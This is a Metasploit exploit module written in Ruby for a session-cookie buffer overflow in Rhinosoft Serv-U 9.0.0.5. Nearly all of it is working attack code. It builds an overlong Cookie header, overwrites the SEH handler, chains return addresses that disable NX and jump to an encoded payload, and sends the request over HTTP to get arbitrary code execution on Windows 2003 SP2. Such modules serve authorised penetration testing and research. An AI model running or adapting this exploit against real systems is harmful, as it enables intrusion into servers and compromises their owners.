##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Rhinosoft Serv-U Session Cookie Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Rhinosoft Serv-U 9.0.0.5.
					Sending a specially crafted POST request with an overly long session cookie
					string, an attacker may be able to execute arbitrary code.
			},
			'Author'         =>
				[
					'Nikolas Rangos <nikolaos[at]rangos.de>',
					'M.Yanagishita <megumi1990[at]gmail.com>', 
					'jduck'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '59772' ],
					[ 'URL', 'http://rangos.de/ServU-ADV.txt' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2009-November/071370.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024, # actually like 40960
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
					'StackAdjustment' => -4096,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					[ 'Windows 2003 SP2 English (NX)',
						{
							'FixESP'	=> 0x0fb02849, 	# add esp, 0x40c / ret 				@libeay32
							'FixESI'	=> 0x78a31e96, 	# pop esi / ret						@mfc90u.dll
							'FixEBP'	=> 0x78a4ae99, 	# push esp / pop ebp / ret 0xc 	@mfc90u.dll
							'Ret'		=> 0x78a3e987, 	# ret 0x20								@mfc90u.dll
							'DisableNX'	=> 0x7c83f547,	# NX Disable							@ntdll.dll
							'JmpESP'	=> 0x78b2c753, 	# jmp esp								@mfc90u.dll
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 1 2009'))
			
			register_options( [ Opt::RPORT(80) ], self.class )

	end

	def exploit
		
		# hit end of stack..
		#sploit = Rex::Text.pattern_create(75000, Rex::Text::DefaultPatternSets)
		sploit = Rex::Text.rand_text(1000) * 75
		
		# new SEH handler (point esp into buffer)
		sploit[41000,4] = [target['FixESP']].pack('V')
		
		# stack frame to bypass NX
		sploit[52+0,4] = [target['FixESI']].pack('V')
		sploit[52+4,4] = [0x10200].pack('V')
		sploit[52+8,4] = [target['FixEBP']].pack('V')
		sploit[52+12,4] = [target['Ret']].pack('V')
		sploit[52+16,4] = [target['JmpESP']].pack('V')
		sploit[52+20,4] = [target['DisableNX']].pack('V')
		sploit[52+24,2] = "\xeb\x20"
		sploit[52+40,payload.encoded.length] = payload.encoded
		
		req =  "POST / HTTP/1.1\r\n"
		req << "Host: #{rhost}:#{rport}\r\n"
		req << "Cookie: Session="
		if rand(1)
			req << "_"
		end
		req << sploit.unpack('H*')[0]
		req << "\r\n"
		req << "\r\n";

		connect
		print_status("Trying target #{target.name}..." % target['Ret'])
		sock.put(req)
		
		select(nil, nil, nil, 1.5)
		handler
	end	
	
end
